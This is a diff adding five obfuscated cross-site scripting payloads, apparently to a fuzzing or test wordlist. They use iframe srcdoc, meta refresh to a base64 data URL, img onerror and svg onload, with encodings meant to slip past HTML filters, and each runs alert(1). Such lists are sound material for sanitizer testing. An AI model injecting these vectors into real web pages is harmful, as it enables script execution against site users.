@@ -1,0 +1,5 @@
+<iframe srcdoc='<meta http-equiv="refresh" content="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">'></iframe>
+<iframe srcdoc='<img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">'></iframe>
+<svg><foreignObject><img src=x onerror='eval(decodeURIComponent("%61%6c%65%72%74%28%31%29"))'></foreignObject></svg>
+<iframe srcdoc='<svg onload="eval(String.fromCharCode(97,108,101,114,116,40,49,41))"></svg>'></iframe>
+<svg><foreignObject><img src=x onerror='eval(atob("YWxlcnQoMSk="))'></foreignObject></svg>
